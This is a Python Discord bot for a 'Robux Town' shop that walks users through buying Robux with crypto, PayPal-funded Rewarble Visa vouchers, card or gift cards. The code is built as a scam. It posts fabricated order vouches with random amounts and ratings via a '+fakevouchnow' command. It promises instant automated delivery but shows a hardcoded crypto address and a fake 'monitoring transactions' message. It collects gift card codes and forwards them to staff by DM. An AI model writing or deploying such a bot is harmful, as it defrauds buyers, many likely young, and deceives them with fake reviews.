#!/usr/bin/env python3
# Robux Town — Final Script: Full Interactive Purchase Flow & Prefix Admin

import os
import asyncio
import random
import json
import re # For input validation
from typing import Dict, Any, Optional, List, Union
from datetime import datetime, timezone

import discord
from discord.ext import commands

# --- CONFIGURATION & SETUP ---

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("Missing BOT_TOKEN")

CONFIG_FILE = "config.json"
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.members = True

# Hardcoded Emojis and Payment Links
EMOJIS: Dict[str, str] = {
    "paypal": "<:PayPal:1435526543513354354>",
    "bitcoin": "<:Bitcoin:1435526466527039579>",
    "ethereum": "<:Ethereum:1435526479126597745>",
    "litecoin": "<:Litecoin:1435526448684339321>", # New LTC ID
    "solana": "<:Solana:1435526514115350549>",     # New SOL ID
    "card": "<:Card:1435526554783318047>",
    "rewarble": "<:Rewarble:1435526590472650763>",
    "loading": "<:loading:1435526855523434576>",
    "warning": "<:warning:1435526954689495091>",
    "robux": "<:Robux:1290924165792272418>", 
    "check": "✅",
    "user_lbl": "👤 User", "user_val": "🔒 Hidden",
    "pay_lbl": "💸 Payment Method", "usd_lbl": "💶 USD Spent",
    "rating_lbl": "⭐ Rating", "order_lbl": "🧾 Order ID"
}

# --- Rate (1:1000) and Minimum/Maximums ---
ROBUX_RATE = 1000 # 1 USD buys 1000 Robux
MIN_USD = 10.0
MIN_ROBUX = 10000

# --- Eneba (PayPal) & G2A (Card) Links ---
ENEBA_LINKS = {
    5: "https://www.eneba.com/rewarble-rewarble-visa-5-usd-voucher-global",
    10: "https://www.eneba.com/rewarble-rewarble-visa-10-usd-voucher-global",
    15: "https://www.eneba.com/rewarble-rewarble-visa-15-usd-voucher-global",
    20: "https://www.eneba.com/rewarble-rewarble-visa-20-usd-voucher-global",
}
G2A_LINKS = {
    5: "https://www.g2a.com/rewarble-visa-gift-card-5-usd-by-rewarble-key-global-i10000502992002",
    10: "https://www.g2a.com/rewarble-visa-gift-card-10-usd-by-rewarble-key-global-i10000502992001",
    20: "https://www.g2a.com/rewarble-visa-gift-card-20-usd-by-rewarble-key-global-i10000502992006",
    25: "https://www.g2a.com/rewarble-visa-gift-card-25-usd-by-rewarble-key-global-i10000502992003",
}

# --- CONFIGURATION MANAGEMENT ---

def load_config() -> Dict[str, Any]:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[CONFIG] Failed reading config.json: {e}. Using defaults.")
    
    return {
        "logo_url": "https://i.ibb.co/FkDYg7gc/robux-town.png",
        "auto_banner_url": "https://i.ibb.co/ZRzkHH9N/robux-town-automatic-order.png",
        "vouch_footer_url": "https://i.ibb.co/5XbkKq64/robux-town-banner.png",
        "min_usd": 10.0,
        "max_usd": 150.0,
        "min_robux_order": 10000,
        "max_robux_order": 1000000,
        "staff_user_ids": [1422665161466187976, 1269145029943758899]
    }

def save_config(config: Dict[str, Any]):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        print("[CONFIG] Saved to disk.")
    except Exception as e:
        print(f"[CONFIG] Persist error: {e}")

BOT_CONFIG = load_config()

# --- UTILITIES ---

def admin_only():
    """Custom check to ensure the user has 'manage_guild' permission."""
    async def predicate(ctx):
        if not ctx.author.guild_permissions.manage_guild:
            await ctx.send("🚫 **Admin Only:** You need 'Manage Server' permissions to use this command.", ephemeral=True, delete_after=10)
            return False
        return True
    return commands.check(predicate)

# --- BOT CLASS & VOUCH LOGIC (Retained from previous step) ---

class RTBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="+", intents=INTENTS, help_command=None)
        
    def _emoji(self, key: str, default: str = "") -> str:
        """Helper to safely retrieve hardcoded emojis."""
        return str(EMOJIS.get(key, default))

    async def on_ready(self):
        print(f"[READY] Logged in as {self.user}")
        print(f"[INFO] Command prefix is '+'")
        print(f"[INFO] Operational commands are admin-only.")

bot = RTBot()

async def post_one_fake_vouch_to_channel(channel: discord.TextChannel):
    min_usd = BOT_CONFIG.get("min_usd", 10.0)
    max_usd = BOT_CONFIG.get("max_usd", 150.0)
    
    usd = round(random.uniform(min_usd, max_usd), 2)
    robux = int(usd) * 1000
    stars = random.choices([5,4,3,2,1], weights=[60,25,10,4,1], k=1)[0]
    order_id = str(random.randrange(10**15, 10**18))

    e = discord.Embed(color=discord.Color.green(), timestamp=datetime.now(timezone.utc))
    e.title = f"{bot._emoji('check')} New Completed Order"
    
    e.add_field(name=f"{bot._emoji('user_lbl')}", value=f"{bot._emoji('user_val')}", inline=True)
    e.add_field(name=f"{bot._emoji('pay_lbl')}", value=f"{bot._emoji('bitcoin')} Crypto", inline=True) 
    e.add_field(name=f"{bot._emoji('robux')} Robux Purchased", value=f"{robux:,} Robux", inline=False)
    e.add_field(name=f"{bot._emoji('usd_lbl')}", value=f"${usd:.2f}", inline=True)
    
    stars_text = "★"*stars + "☆"*(5-stars) + f" ({stars}/5)"
    e.add_field(name=f"{bot._emoji('rating_lbl')}", value=stars_text, inline=True)
    e.add_field(name=f"{bot._emoji('order_lbl')}", value=order_id, inline=False)

    if BOT_CONFIG.get("vouch_footer_url"):
        e.set_image(url=BOT_CONFIG["vouch_footer_url"])

    try:
        await channel.send(embed=e)
    except Exception as ex:
        print(f"[VOUCH] Post failed: {ex}")
        
# --- TICKET SYSTEM VIEWS & FLOW ---

# Forward declaration for the next step in the flow
class PaymentMethodSelect(discord.ui.View): pass

class OrderConfirmationView(discord.ui.View):
    """Step 3/5: Confirm Robux Purchase Amount."""
    def __init__(self, robux_amount: int):
        super().__init__(timeout=180)
        self.robux_amount = robux_amount
        self.usd_amount = robux_amount / ROBUX_RATE

    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=interaction.message.content + "\n\n✅ Confirmed.", view=None)
        
        # Move to Step 4/5: Payment Method Selection
        await interaction.channel.send(
            embed=discord.Embed(
                title="Please select your preferred payment method (4/5)",
                description="Please select your preferred payment method from the options provided below.",
                color=discord.Color.blue()
            ),
            view=PaymentMethodSelect(self.robux_amount)
        )
        self.stop()

    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=interaction.message.content + "\n\n❌ Cancelled.", view=None)
        await interaction.channel.send("Purchase cancelled. Please send a new Robux amount to restart the process.", delete_after=60)
        self.stop()

    async def on_timeout(self):
        if self.message:
            await self.message.edit(content=self.message.content + "\n\n❌ Purchase timed out.", view=None)

class CryptoSelectionView(discord.ui.View):
    """Step 4b/5: Select specific cryptocurrency (from the 'Cryptocurrency' selection)."""
    def __init__(self, robux_amount: int, crypto_type: str):
        super().__init__(timeout=300)
        self.robux_amount = robux_amount
        self.usd_amount = robux_amount / ROBUX_RATE
        self.crypto_type = crypto_type

    @discord.ui.select(
        placeholder="Select your crypto...",
        options=[
            discord.SelectOption(label="Bitcoin", value="btc", emoji=EMOJIS["bitcoin"], description="BTC"),
            discord.SelectOption(label="Litecoin", value="ltc", emoji=EMOJIS["litecoin"], description="LTC"),
            discord.SelectOption(label="Ethereum", value="eth", emoji=EMOJIS["ethereum"], description="ETH"),
            discord.SelectOption(label="Solana", value="sol", emoji=EMOJIS["solana"], description="SOL"),
        ]
    )
    async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
        crypto = select.values[0]
        
        # Mock Crypto Invoice (as real integration is impossible here)
        mock_crypto_address = "bc1q8pxcpy9x2n7c3nstlktl5jd0m2wdnauya3hxw" 
        mock_crypto_amount = round(self.usd_amount / random.uniform(20000, 30000), 8) 

        invoice_embed = discord.Embed(
            title=f"{crypto.upper()} Payment Invoice (5/5)",
            description=f"This transaction is approximately **${self.usd_amount:.1f}**. To ensure we can validate your payment successfully please copy and paste the value of **{mock_crypto_amount:.8f}** and send it to our address.",
            color=discord.Color.dark_green()
        )
        invoice_embed.add_field(name="Payment Address", value=f"```\n{mock_crypto_address}\n```", inline=False)
        invoice_embed.add_field(name=f"Amount {crypto.upper()}", value=f"```\n{mock_crypto_amount:.8f}\n```", inline=True)
        invoice_embed.add_field(name="Amount USD", value=f"${self.usd_amount:.1f}", inline=True)
        
        # Final monitoring message
        monitoring_embed = discord.Embed(
            title="Checking For Transactions",
            description=f"{bot._emoji('loading')} We are actively monitoring transactions, Please proceed with your payment to complete the transaction process.",
            color=discord.Color.gold()
        )
        
        await interaction.response.edit_message(embed=monitoring_embed, content=f"You selected **{crypto.upper()}**.", view=None)
        await interaction.channel.send(embed=invoice_embed)
        self.stop()
        
    async def on_timeout(self):
        if self.message:
            await self.message.edit(content="❌ Crypto selection timed out.", view=None)

class PurchaseSubmitDetails(discord.ui.View):
    """View to initiate the Gift Card/Eneba submission modal."""
    def __init__(self, robux_amount: int, payment_method_name: str):
        super().__init__(timeout=300)
        self.robux_amount = robux_amount
        self.payment_method_name = payment_method_name 
    
    @discord.ui.button(label="Submit a Giftcard", style=discord.ButtonStyle.secondary)
    async def submit_giftcard(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(PurchaseDetailsModal(interaction.user.id, self.payment_method_name))
        self.stop()

class PurchaseDetailsModal(discord.ui.Modal, title="Submit Gift Card / Payment Details"):
    """Modal to capture payment info (reused from previous step)."""
    def __init__(self, user_id: int, payment_method_name: str):
        super().__init__(timeout=300)
        self.user_id = user_id
        self.payment_method_name = payment_method_name
        
    details = discord.ui.TextInput(
        label="Code, details, or link to screenshot:",
        style=discord.TextStyle.paragraph,
        placeholder="e.g., ABC-XYZ-123 or image link",
        required=True,
        max_length=1500
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"{bot._emoji('loading')} Submitting details for staff verification...", ephemeral=True)
        
        details_text = self.details.value
        user = interaction.user
        thread = interaction.channel
        
        # 1. Notify Staff via DM (Uses BOT_CONFIG's staff_user_ids)
        for staff_id in BOT_CONFIG.get("staff_user_ids", []):
            try:
                staff_user = bot.get_user(staff_id) or await bot.fetch_user(staff_id)
                if staff_user:
                    staff_embed = discord.Embed(
                        title=f"{bot._emoji('warning')} PENDING PAYMENT CHECK ({self.payment_method_name})",
                        description=f"**User:** {user.mention} (`{user.id}`)\n**Thread:** {thread.mention}\n\n**Details Submitted:**",
                        color=discord.Color.red(),
                        timestamp=datetime.now(timezone.utc)
                    )
                    staff_embed.add_field(name="Payment Input", value=details_text[:1024], inline=False)
                    await staff_user.send(embed=staff_embed)
            except Exception as e:
                print(f"[STAFF_DM] Failed to DM staff {staff_id}: {e}")
        
        # 2. Update Thread for user/staff
        final_embed = discord.Embed(
            title=f"{bot._emoji('loading')} Awaiting Staff Verification",
            description=f"Thank you, {user.mention}. Your details have been securely forwarded to staff for review.\n\n"
                        f"**Next Steps:** Staff will update this thread once verification is complete.",
            color=discord.Color.orange()
        )
        
        await thread.send(embed=final_embed, view=TicketStaffView(user.id))
        self.stop()

class PaymentMethodSelect(discord.ui.View):
    """Step 4/5: Select Payment Method."""
    def __init__(self, robux_amount: int):
        super().__init__(timeout=300)
        self.robux_amount = robux_amount

    @discord.ui.select(
        placeholder="Select your payment method...",
        options=[
            discord.SelectOption(label="Cryptocurrency", value="crypto", emoji=EMOJIS["bitcoin"], description="Pay with Cryptocurrency (BTC, LTC, ETH, SOL)"),
            discord.SelectOption(label="PayPal (Powered by Eneba)", value="paypal", emoji=EMOJIS["paypal"], description="Purchase required Rewarble Visa via Eneba (PayPal is accepted there)"),
            discord.SelectOption(label="Card (Powered by G2A)", value="card", emoji=EMOJIS["card"], description="Purchase required Rewarble Visa via G2A (Credit/Debit/Cashapp)"),
            discord.SelectOption(label="Giftcards", value="giftcard", emoji=EMOJIS["rewarble"], description="Pay with Giftcards (Rewarble, Steam, etc.)"),
        ]
    )
    async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
        method = select.values[0]
        usd = self.robux_amount / ROBUX_RATE
        
        await interaction.response.edit_message(content=interaction.message.embeds[0].title + "\n\n✅ Method Selected.", view=None)

        if method == "crypto":
            crypto_embed = discord.Embed(
                title="Please select your preferred crypto (4/5)",
                description="You have selected **Cryptocurrency** as your payment method. What crypto will you be sending?",
                color=discord.Color.blue()
            )
            await interaction.channel.send(embed=crypto_embed, view=CryptoSelectionView(self.robux_amount, method))
        
        elif method in ["paypal", "card", "giftcard"]:
            link_list = ENEBA_LINKS if method == "paypal" else G2A_LINKS
            link_type = "Eneba" if method == "paypal" else "G2A"
            
            # Find the closest link price that covers the required USD amount
            required_links_desc = []
            
            # Group all links that cover the required amount, or show all if none cover it
            links_to_show = {price: link for price, link in link_list.items() if price >= usd}
            if not links_to_show:
                 links_to_show = link_list

            for price, link in links_to_show.items():
                required_links_desc.append(f"[{price:.0f}$ Link]({link})")
            
            # Step 5/5: Gift Card/Rewarble Invoice
            invoice_embed = discord.Embed(
                title=f"{method.capitalize()} Payment Invoice (5/5)",
                description=f"Please purchase a {bot._emoji('rewarble')} **Rewarble Visa Gift Card** with the required value for your transaction. Once you have the gift card, submit the card information for verification. Our team will review and confirm the details shortly after submission.\n\n**Amount USD:** ${usd:.1f}",
                color=discord.Color.blue()
            )
            
            # List of links for the user to buy
            link_embed = discord.Embed(
                title=f"Here you can purchase via {method.capitalize()} on {link_type}",
                description=f"Here are links to buy Rewarble Visa vouchers via {link_type}. (If the amount is not available, combine multiple codes):",
                color=discord.Color.dark_grey()
            )
            
            # Format links nicely in fields
            link_fields = []
            count = 0
            current_field_value = ""
            for price, link in links_to_show.items():
                current_field_value += f"[{price:.0f}$ Voucher]({link})\n"
                count += 1
                if count % 3 == 0 or count == len(links_to_show):
                    link_fields.append(current_field_value)
                    current_field_value = ""

            for i, val in enumerate(link_fields):
                if val:
                    link_embed.add_field(name=f"Voucher Links (Cont.)" if i > 0 else "Voucher Links", value=val, inline=True)


            await interaction.channel.send(embeds=[link_embed, invoice_embed])
            
            # Final waiting message
            waiting_embed = discord.Embed(
                title="Waiting For A Giftcard",
                description="⚪ We are actively seeking gift card submissions. Once you submit a gift card, please wait patiently for our staff to verify it.",
                color=discord.Color.light_grey()
            )
            await interaction.channel.send(embed=waiting_embed, view=PurchaseSubmitDetails(self.robux_amount, method))
        
    async def on_timeout(self):
        if self.message:
            await self.message.edit(content="❌ Payment method selection timed out.", view=None)

class StartBuyingView(discord.ui.View):
    """Step 1/5: Start Buying Robux."""
    def __init__(self, user_id: int):
        super().__init__(timeout=180)
        self.user_id = user_id
        
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=interaction.message.content + "\n\n✅ Yes.", view=None)
        
        # Move to Step 2/5: Ask for amount
        await interaction.channel.send(
            embed=discord.Embed(
                title="How much Robux would you like to buy? (2/5)",
                description=f"Please specify the amount of Robux you would like to purchase:\nExample: **50,000**\nThe minimum order amount is: **{BOT_CONFIG.get('min_robux_order', MIN_ROBUX):,}** Robux",
                color=discord.Color.blue()
            )
        )
        self.stop()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content="❌ Purchase cancelled. Closing thread in 60s.", view=None)
        self.stop()
        
    async def on_timeout(self):
        if self.message:
            await self.message.edit(content=self.message.content + "\n\n❌ Purchase timed out.", view=None)

class TicketStaffView(discord.ui.View):
    """View for staff to control the final order status."""
    def __init__(self, invoker_id: int):
        super().__init__(timeout=None)
        self.invoker_id = invoker_id
        
    @discord.ui.button(label="Complete Order", style=discord.ButtonStyle.success)
    async def complete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in BOT_CONFIG.get("staff_user_ids", []):
            await interaction.response.send_message("❌ Only designated staff can use this button.", ephemeral=True)
            return
        await interaction.response.edit_message(content=f"✅ **Order Completed by {interaction.user.mention}.**", view=None)
        self.stop()
    
    @discord.ui.button(label="Invalid / Close", style=discord.ButtonStyle.danger)
    async def close(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in BOT_CONFIG.get("staff_user_ids", []):
            await interaction.response.send_message("❌ Only designated staff can use this button.", ephemeral=True)
            return
        await interaction.response.edit_message(content=f"❌ **Order Closed by {interaction.user.mention}.**", view=None)
        self.stop()
        
class PurchaseButtonView(discord.ui.View):
    """Initial view posted by +post_autoorder."""
    def __init__(self): 
        super().__init__(timeout=None)
        
    @discord.ui.button(label="Purchase Robux", style=discord.ButtonStyle.primary, custom_id="purchase_btn", emoji="💠")
    async def purchase(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("A staff member will assist you shortly in this thread.", ephemeral=True)
        parent = interaction.channel
        
        try:
            th = await parent.create_thread(name=f"Order — {interaction.user.display_name}", auto_archive_duration=10080)
            
            # Step 1/5: Start Buying Robux
            await th.send(
                embed=discord.Embed(
                    title="Would you like to start buying robux? (1/5)",
                    description="Please click \"Yes\" if you would like to start purchasing your Robux.",
                    color=discord.Color.blue()
                ),
                view=StartBuyingView(interaction.user.id)
            )
            # Send initial disclaimer message
            await th.send(
                embed=discord.Embed(
                    title="⚠️ Please Note",
                    description="Please make sure that all conversations related to the deal are done within this ticket. Failing to do so may put you at risk of being scamming.\n\nOur staff will never DM you regarding any deals that are active or have already been completed.",
                    color=discord.Color.orange()
                )
            )

        except Exception as e: 
            print(f"[ORDER] Failed to create thread: {e}")
            await interaction.followup.send("❌ Error: Could not start the purchase process. Check bot permissions.", ephemeral=True)

# --- LISTENER FOR USER INPUT (STEP 2/5) ---
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    # Check if the message is within a thread/channel where a purchase flow might be active
    if isinstance(message.channel, discord.Thread):
        thread = message.channel
        
        try:
            # Simple check for a message containing only a number (the Robux amount)
            if re.fullmatch(r"^\d{4,7}$", message.content.strip()):
                robux_amount = int(message.content.strip())
                usd_amount = robux_amount / ROBUX_RATE
                
                min_robux = BOT_CONFIG.get('min_robux_order', MIN_ROBUX)
                max_robux = BOT_CONFIG.get('max_robux_order', 1000000)

                if robux_amount < min_robux or robux_amount > max_robux:
                    await thread.send(f"{message.author.mention} ❌ Invalid amount. Please enter a value between {min_robux:,} and {max_robux:,} Robux.", delete_after=15)
                    await message.delete() 
                    return

                # Step 3/5: Confirmation
                await thread.send(
                    embed=discord.Embed(
                        title=f"Would you like to purchase this amount of Robux? (3/5)",
                        description=f"Are you sure you want to purchase **{robux_amount:,} Robux**:\nCurrent Rate: **${1.0 / ROBUX_RATE * 1000:.1f} per 1,000 Robux**\nPrice in USD: **${usd_amount:.1f}**",
                        color=discord.Color.blue()
                    ),
                    view=OrderConfirmationView(robux_amount)
                )
                await message.delete()
                return
        
        except Exception as e:
            # We catch any exception in the flow, but do not send an error message to the user 
            # as it could be a typo or non-number message.
            pass

    # Process prefix commands after checking for internal flow input
    await bot.process_commands(message)

# --- PREFIX COMMANDS (Admin Only) ---

@bot.command(name="help")
async def custom_help(ctx: commands.Context):
    # ... (content remains the same)
    if not ctx.author.guild_permissions.manage_guild:
        await ctx.send("This bot uses the `+` prefix. Operational commands are restricted to server administrators.", ephemeral=True, delete_after=10)
        return

    help_embed = discord.Embed(
        title="✨ Robux Bot Admin Commands",
        description="All commands use the `+` prefix and require **Manage Server** permission.",
        color=discord.Color.gold()
    )
    
    help_embed.add_field(name="`+help`", value="Displays this message.", inline=False)
    help_embed.add_field(name="`+post_autoorder`", value="Posts the main Automated Purchase panel and button in the current channel.", inline=False)
    help_embed.add_field(name="`+fakevouchnow`", value="Posts one fake vouch in the current channel (uses config.json range).", inline=False)
    help_embed.add_field(name="`+setbranding <logo_url> [banner_url]`", value="Updates Logo and Auto-Order Banner URLs (Saves to config.json).", inline=False)
    help_embed.add_field(name="`+setvouchrange <min_usd> <max_usd>`", value="Sets the min/max USD range for fake vouch posts (Saves to config.json).", inline=False)
    help_embed.add_field(name="`+currentconfig`", value="Shows the currently loaded configuration and file status.", inline=False)

    await ctx.send(embed=help_embed)

@bot.command(name="post_autoorder")
@admin_only()
async def post_autoorder_cmd(ctx: commands.Context):
    em = discord.Embed(
        title="🛒 Automated Purchase", 
        description=(
            "This bot is a Discord bot designed to streamline the process of purchasing and distributing Robux, the virtual currency used in Roblox.\n\n"
            "**Instant Robux Delivery:**\n"
            "• Receive your Robux within moments of purchase.\n"
            "**Fully Automated Payments:**\n"
            "• Experience seamless transactions with our fully automated payment system.\n"
            "**Transaction Security:**\n"
            "• Our bot guarantees a safe and secure payment process every time.\n"
            "**Diverse Payment Options:**\n"
            "• Enjoy a variety of automated payment methods including Cryptocurrency, PayPal, and more!\n"
        ), 
        color=discord.Color.dark_magenta()
    )
    if BOT_CONFIG.get("logo_url"): em.set_thumbnail(url=BOT_CONFIG["logo_url"])
    if BOT_CONFIG.get("auto_banner_url"): em.set_image(url=BOT_CONFIG["auto_banner_url"])
    await ctx.send(embed=em, view=PurchaseButtonView())
    await ctx.message.delete()

@bot.command(name="fakevouchnow")
@admin_only()
async def fakevouchnow_cmd(ctx: commands.Context):
    if not isinstance(ctx.channel, discord.TextChannel):
        await ctx.send("❌ This command must be run in a text channel.", delete_after=10)
        return
    await post_one_fake_vouch_to_channel(ctx.channel)
    try: await ctx.message.delete()
    except Exception: pass

@bot.command(name="setbranding")
@admin_only()
async def set_branding_cmd(ctx: commands.Context, logo_url: Optional[str] = None, banner_url: Optional[str] = None):
    if not logo_url and not banner_url:
        await ctx.send("❌ Usage: `+setbranding <new_logo_url> [new_banner_url]` (Provide at least one URL).", delete_after=15)
        return
    updated = []
    if logo_url:
        BOT_CONFIG["logo_url"] = logo_url
        updated.append("Logo URL")
    if banner_url:
        BOT_CONFIG["auto_banner_url"] = banner_url
        updated.append("Auto-Order Banner URL")
    save_config(BOT_CONFIG)
    await ctx.send(f"✅ Branding updated and persisted: **{', '.join(updated)}**.", delete_after=10)

@bot.command(name="setvouchrange")
@admin_only()
async def set_vouch_range_cmd(ctx: commands.Context, min_usd: float, max_usd: float):
    if min_usd <= 0 or max_usd <= min_usd:
        await ctx.send("❌ Error: `min_usd` must be positive and less than `max_usd`.", delete_after=15)
        return
    BOT_CONFIG["min_usd"] = min_usd
    BOT_CONFIG["max_usd"] = max_usd
    save_config(BOT_CONFIG)
    min_robux = int(min_usd) * 1000
    max_robux = int(max_usd) * 1000
    await ctx.send(f"✅ Vouch range updated and persisted: **${min_usd:.2f} to ${max_usd:.2f}** ({min_robux:,} to {max_robux:,} Robux).", delete_after=10)

@bot.command(name="currentconfig")
@admin_only()
async def current_config_cmd(ctx: commands.Context):
    embed = discord.Embed(title="⚙️ Current Bot Configuration (config.json)", color=discord.Color.blue())
    staff_mentions = [f"<@{uid}> (`{uid}`)" for uid in BOT_CONFIG.get("staff_user_ids", [])]
    embed.add_field(name="Vouch Range (USD)", value=f"Min: **${BOT_CONFIG.get('min_usd', 10.0):.2f}** | Max: **${BOT_CONFIG.get('max_usd', 150.0):.2f}**", inline=False)
    embed.add_field(name="Branding URLs", value=f"Logo: {BOT_CONFIG.get('logo_url', 'N/A')}\nBanner: {BOT_CONFIG.get('auto_banner_url', 'N/A')}", inline=False)
    embed.add_field(name="Staff Notifications", value="\n".join(staff_mentions) if staff_mentions else "None set.", inline=False)
    embed.add_field(name="Order Limits", value=f"Min Robux: {BOT_CONFIG.get('min_robux_order', 10000):,}\nMax Robux: {BOT_CONFIG.get('max_robux_order', 1000000):,}", inline=False)
    await ctx.send(embed=embed)
    
# --- MAIN ---

def main():
    bot.run(BOT_TOKEN)

if __name__ == "__main__":
    main()
